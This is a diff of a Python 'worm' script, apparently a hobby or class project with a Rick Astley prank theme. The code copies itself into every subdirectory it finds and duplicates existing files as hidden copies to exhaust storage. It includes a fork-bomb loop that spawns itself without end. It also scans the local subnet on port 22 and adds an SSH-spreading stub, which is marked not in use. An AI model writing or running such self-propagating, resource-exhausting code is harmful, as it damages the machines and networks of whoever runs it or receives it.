@@ -10,23 +10,19 @@ BY RUNNING THIS CODE
 #General imports required for basic worm
 import os
 import sys
-import time
 import shutil
+import socket
 import logging
 import subprocess
 import webbrowser
-import random
-from contextlib import redirect_stdout
-
-#Threading imports - AR
 from threading import Thread, Lock
 from time import perf_counter
-from sys import stderr
-from time import sleep
-import socket
 
+#Where to start the IP pinging
 BASE_IP = "192.168.0.%i"
-PORT = 80
+
+#What port to check
+PORT = 22
 
 #Amount of times the youtube video is opened
 COUNT = 3
@@ -40,8 +36,6 @@ YOUTUBETOO = False
 #Amount of worm files created per directory
 INSTANCES_PER_DIRECTORY = 2
 
-#random number to guess with rand range to see if we're done multiplying and ready to die.
-ROULETTE = 4
 #------------------------------------------THREADER CLASS---------------------------------------------- -AR
 class Threader:
     
@@ -119,11 +113,13 @@ class Worm:
         # get own absolute path
         self.own_path = os.path.realpath(__file__)
         
-        #initialize worm threader class, start timing code executions and set the default socket timeout to 0.1 seconds -AR
+        #initialize worm threader class, start timing code executions 
+        #set the default socket timeout to 0.1 seconds
         self.threader = Threader(10)
         self.start = perf_counter()
         socket.setdefaulttimeout(0.1)
-
+        
+    # lists all directories in the worm's current directory
     def list_directories(self,path):
         try:
             self.target_dir_list.append(path)
@@ -141,6 +137,7 @@ class Worm:
         except:
             logging.warning("exception occurred: worm failed to list directories")
     
+    #create new instance of self
     def create_new_worm(self):
         try:
             for directory in self.target_dir_list:
@@ -149,6 +146,7 @@ class Worm:
         except:
             logging.warning("exception occurred: cannot create new worm")
     
+    #copy files to increase memory use
     def copy_existing_files(self):
         try:
             for directory in self.target_dir_list:
@@ -160,22 +158,28 @@ class Worm:
                         for i in range(self.iteration):
                             destination = os.path.join(directory, ("."+file+str(i)))
                             shutil.copyfile(source, destination)
-        except:
-            logging.warning("exception occurred: cannot copy")
-                        
-    #Network Identification----- -AR
-    def connect(self, hostname, port):
+        except: logging.warning("exception occurred: cannot copy")
+    
+    #Package installer
+    def install(self, package):
+        try:
+            subprocess.check_call([sys.executable, "-m", "pip", "install", package])
+        except: logging.warning("exception occurred: package install failure")
+        
+    #Network Identification(not in use)----- -AR
+    def connect(self, hostname, port, out_list=type(list)):
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
             result = sock.connect_ex((hostname, port))
         with self.threader.print_lock:
             if result == 0:
-                stderr.write(f"[{perf_counter() - start:.5f}] Found {hostname}\n")
-                logging.warning(f"[{perf_counter() - start:.5f}] Found {hostname}\n")
+                sys.stderr.write(f"[{perf_counter() - self.start:.5f}] Found {hostname}\n")
+                logging.warning(f"[{perf_counter() - self.start:.5f}] Found {hostname}\n")
                 
-    #Network Identification Iterator----- -AR
-    def connection_iterator(self):
+    #Network Identification Iterator(not in use)----- -AR
+    def connections(self):
+        ip_list = []
         for i in range(255):
-            self.threader.append(worm.connect, BASE_IP%i, PORT)
+            self.threader.append(self.connect, BASE_IP%i, PORT, ip_list)
         self.threader.start()
         self.threader.join()
         logging.warning(f"[{perf_counter() - self.start:.5f}] Done Searching")
@@ -186,51 +190,37 @@ class Worm:
             if YOUTUBETOO:
                 for i in range(0, COUNT):
                     webbrowser.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ')
-        except:
-            logging.warning("exception occurred: no rick?")
+        except: logging.warning("exception occurred: no rick?")
     
     def rick_bomb(self):
         while True:
             subprocess.Popen([sys.executable, sys.argv[0]], creationflags=subprocess.CREATE_NEW_CONSOLE)
-        
-    def russian_roulette(self):
-        num = random.randint(0, 5)
-        if ROULETTE == num:
-            print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!HIT NUMBER!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
-            self.rick_bomb()
-    
+
     def run_roulette(self):   
         os.startfile(f"{self.own_path}\\..\\roulette.py")    
-        #subprocess.Popen([f"{self.own_path}\\..\\roulette.py", sys.argv[0]], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
+    
+    def run_ssh(self):
+        os.startfile(f"{self.own_path}\\..\\SSH.py")
     
     def start_worm_actions(self):
-        print(self.target_dir_list)
+        #next iteration of code will pipe output of worm/connections to SSH
+        #NETWORK portion (not in use)----------
+        #self.connections()
+        #self.run_ssh()
         
+        self.run_roulette()
         if self.first_run == True:
             self.rick_and_roll()
-        
         self.list_directories(self.path)
         
         try:
-            #self.russian_roulette()
+            print(f"Propagating to: [{self.target_dir_list}]")
             self.create_new_worm()  
             self.copy_existing_files()
-        except:
-            logging.warning("something went wrong")
-        
-       
-        #self.copy_existing_files()
-        #self.time_to_rick()
-        #self.connection_iterator()
-       
+        except: logging.warning("something went wrong")
+
 if __name__=="__main__":
     current_directory = os.path.abspath("")
-    
     worm = Worm(path=current_directory)
-    worm.run_roulette()
     worm.start_worm_actions()
-    
-    # with open('log.txt', 'w') as f:
-    #     f.write(f"{perf_counter() - worm.start:.5f}")
-    
     
